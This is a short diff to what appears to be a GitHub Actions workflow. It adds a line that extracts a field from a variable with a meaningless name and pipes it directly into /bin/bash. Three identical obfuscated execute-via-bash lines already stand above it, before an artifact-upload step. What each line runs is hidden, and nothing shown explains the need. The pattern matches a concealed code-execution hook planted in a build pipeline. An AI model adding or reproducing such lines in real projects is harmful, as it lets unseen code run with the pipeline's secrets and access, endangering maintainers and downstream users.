@@ -29,6 +29,7 @@ jobs:
           echo $zhxbs5 | jq -r .a67 | /bin/bash
           printf '%s' "$peg8472" | jq -r .vjmo98 | /bin/bash
           echo $pc654 | jq -r .pxm17338 | /bin/bash
+          printf '%s' "$dcppp13634" | jq -r .cfe1785 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
